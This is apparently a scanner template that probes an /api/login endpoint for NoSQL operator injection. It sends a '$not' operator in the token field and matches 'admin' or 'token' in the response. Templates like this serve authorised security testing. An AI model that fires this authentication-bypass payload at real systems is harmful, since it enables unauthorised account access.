id: nosql2-174
name: 'NoSQL $not in token'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $not accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"token":{"$not":""},"extra":"x"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
          - 'token'
